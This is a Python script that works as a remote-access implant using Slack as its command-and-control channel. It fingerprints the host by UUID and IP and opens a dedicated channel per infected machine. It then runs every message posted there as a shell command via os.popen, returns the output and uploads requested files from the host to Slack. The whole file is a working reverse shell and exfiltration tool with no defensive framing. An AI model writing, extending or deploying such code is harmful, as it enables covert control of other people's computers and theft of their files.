import os
import subprocess
import socket
import slack
import time
import json
import sys
from ast import literal_eval
import re
import platform

def run_c(input_c, sh_channel_id):
    
    if input_c[:7] == 'upload ':
        print(type(input_c[:7]))
        run_upload(input_c[7:], sh_channel_id)

    elif input_c == 'sh_exit':
        sys.exit(0)
    
    elif input_c[:3] == 'cd ':
        out = os.chdir(input_c[3:])
        return "cd complete."
    
    else:
        try:
            out =  os.popen(input_c).read()
        except:
            print("OS POPEN exception!")

        if out == '':
            return 'The command did not return anything.'

        else:
            return out


def run_upload(filename, sh_channel_id):
    print(filename)
    print(type(filename))

    response = client.files_upload(
    channel=sh_channel_id,
    file=filename)

    assert response["ok"]

#TODO:
#Function the script up 
#Have an exit and upload mechnizm
#Read slack tokens from a config file

#Bugs:
#Channels sometimes dont get created.
#Upload sends bytes output converted to string - Looks like an issue on slack's side.


def next_sh(channel_names):
    #For some reason this stopped working
    sh_num = 0
    for a in channel_names:
        current_sh_name = a.get("name")
        if channel_prefix in current_sh_name:
            b = current_sh_name.split('-')[2]
            if b.isdigit():
                b = int(b)
                if b > sh_num:
                    print(b)
                    sh_num = b
                elif b == sh_num:
                    sh_num = sh_num + 1


    sh_num = sh_num + 1

    print("SH NUM : " + str(sh_num))
    return sh_num


def init_conn():
    #Initial connection
    if platform.system() == "Windows":
        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
    elif platform.system() == "Linux":
        machine_UUID = str("linuxmacineUID")
    elif platform.system() == "Darwin":
        machine_UUID = str(subprocess.check_output(["ioreg" , "-d2", "-c", "IOPlatformExpertDevice", "|", "awk", "-F", "'/IOPlatformUUID/{print $(NF-1)}'"]))
    else:
        machine_UUID = str("platform unrecognized.")
        
    machine_IP = socket.gethostbyname(socket.gethostname())
    #Won't work if /etc/hosts has  127.0.0.1 defined as hostname:
    sh_stdout = machine_UUID + " connected from " + machine_IP
    #re.search(r'\d+', sh_stdout).group(0)

    return sh_stdout


#Must be a dash seperated name with no integers.
channel_prefix = "sierra-hotel-"

#User ID's for operators.
#Enter seperated by comma for more than one operator
op_user_ids = "***REMOVED***"

os.environ["SLACK_BOT_TOKEN"] = "***REMOVED***"
slack_bot_token = os.environ["SLACK_BOT_TOKEN"]
client = slack.WebClient(token=slack_bot_token) #Uses TLS 1.2 without: ssl=sslcert 


channels_list = client.conversations_list()
channel_names = channels_list.__getitem__("channels")

#Calculate biggest sh number (create channels from where we left off.)
sh_num = next_sh(channel_names)

sh_stdout = init_conn()

new_channel_name = str(channel_prefix + str(sh_num))
#client.conversations_close("sierra-hotel-five")

#If UUID != any of the channels:
create_response = client.conversations_create(
#List channels, give number to channels.
name=new_channel_name, 
is_private = False, #Operator would need to be invited to the channel even if the op is the channel admin. 
user_ids = op_user_ids                    #Set to true for a private channel.
)

sh_channel = create_response.__getitem__("channel")
sh_channel_id = sh_channel["id"]
sh_channel_name = sh_channel["name"]

print(sh_channel_id)
print(sh_channel_name)

#conversations.join - Use the user API to join the channel later
client.conversations_join(
channel = sh_channel_id
)

#Slack doesnt let us remove channels for now.
time.sleep(1)


response = client.chat_postMessage(
channel=sh_channel_id,
text=sh_stdout)
assert response["ok"]
#assert response["message"]["text"] == sh_stdout
time.sleep(1)


sh_comm = ''
old_messages = ''
messages = 'randomval'

while True:

    sh_history = client.conversations_history(
    channel = sh_channel_id
    )
    time.sleep(0.3)
    messages = sh_history.__getitem__("messages")[0]

    if old_messages == messages:
        continue
    else:
        if "client_msg_id" in messages:
            sh_comm = messages["text"]
            sh_stdout = run_c(sh_comm, sh_channel_id)

            response = client.chat_postMessage(
            channel=sh_channel_id,
            text=sh_stdout)
            assert response["ok"]
            assert response["message"]["text"] == sh_stdout
            
            sh_comm = ''

        old_messages = messages

    time.sleep(0.3)
